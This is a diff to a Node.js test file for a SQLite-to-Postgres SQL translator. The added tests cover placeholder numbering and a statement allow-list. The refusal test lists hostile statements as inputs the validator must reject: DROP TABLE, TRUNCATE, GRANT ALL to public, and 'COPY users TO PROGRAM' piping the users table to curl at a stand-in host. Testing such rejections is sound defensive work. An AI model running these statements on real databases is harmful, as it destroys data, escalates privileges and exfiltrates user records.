@@ -4,7 +4,7 @@
  */
 import test from "node:test";
 import assert from "node:assert/strict";
-import { translateSql, isSingleStatement, countPlaceholders, UTC_TIMESTAMP_SQL } from "../sql.mjs";
+import { translateSql, isSingleStatement, countPlaceholders, maxPlaceholderIndex, assertAllowedStatement, UTC_TIMESTAMP_SQL } from "../sql.mjs";
 
 test("bare ? placeholders become numbered $n in order", () => {
   const out = translateSql("SELECT * FROM users WHERE id = ? AND email = ?");
@@ -58,6 +58,57 @@ test("AUTOINCREMENT becomes an identity column and INTEGER widens to bigint", ()
 
 test("REAL widens to double precision", () => {
   assert.match(translateSql("cost_usd REAL NOT NULL DEFAULT 0"), /cost_usd double precision/);
+});
+
+test("placeholder numbering is global across literal-separated segments", () => {
+  const sql =
+    "INSERT INTO admin_memberships (user_id, email, display_name, role, status, scopes, created_by, last_active_at) " +
+    "VALUES ('service:sadmin', ?, 'SAdmin Service', 'super_admin', 'active', ?, 'system', CURRENT_TIMESTAMP)";
+  const out = translateSql(sql);
+  assert.match(out, /VALUES \('service:sadmin', \$1, 'SAdmin Service', 'super_admin', 'active', \$2, 'system'/);
+  assert.equal(maxPlaceholderIndex(out), 2);
+  assert.equal(countPlaceholders(sql), 2);
+});
+
+test("every translated statement binds exactly as many values as it has placeholders", () => {
+  const cases = [
+    "INSERT INTO users (id, email, display_name) VALUES (?, ?, ?)",
+    "INSERT INTO audit_logs (actor_id, action, ip, user_agent) VALUES (?, ?, '', ?)",
+    "UPDATE sources SET last_error = ?1, next_scan_at = ?2 WHERE id = ?3",
+    "INSERT OR IGNORE INTO user_states (user_id, email, payload, updated_at) VALUES (?, ?, ?, CURRENT_TIMESTAMP)",
+  ];
+  for (const sql of cases) {
+    assert.equal(maxPlaceholderIndex(translateSql(sql)), countPlaceholders(sql), sql);
+  }
+});
+
+test("destructive and administrative verbs are refused", () => {
+  for (const sql of [
+    "DROP TABLE users",
+    "ALTER TABLE users ADD COLUMN x TEXT",
+    "TRUNCATE TABLE jobs",
+    "GRANT ALL ON users TO public",
+    "CREATE ROLE evil",
+    "CREATE DATABASE evil",
+    "COPY users TO PROGRAM 'curl evil'",
+  ]) {
+    assert.throws(() => assertAllowedStatement(sql), /not permitted/, sql);
+  }
+});
+
+test("the application's real statement shapes are allowed", () => {
+  for (const sql of [
+    "SELECT * FROM jobs WHERE id = ?",
+    "INSERT OR IGNORE INTO user_states (a, b) VALUES (?, ?)",
+    "UPDATE sources SET last_error = ? WHERE id = ?",
+    "DELETE FROM api_rate_limits WHERE window_start < ?",
+    "CREATE TABLE IF NOT EXISTS audit_logs (id INTEGER PRIMARY KEY AUTOINCREMENT)",
+    "CREATE INDEX IF NOT EXISTS idx_x ON y (a, b)",
+    "CREATE UNIQUE INDEX IF NOT EXISTS idx_z ON q (a) WHERE a <> ''",
+    "-- leading comment\nSELECT 1",
+  ]) {
+    assert.doesNotThrow(() => assertAllowedStatement(sql), sql);
+  }
 });
 
 test("the real ORDER BY / ON CONFLICT upsert statement round-trips", () => {
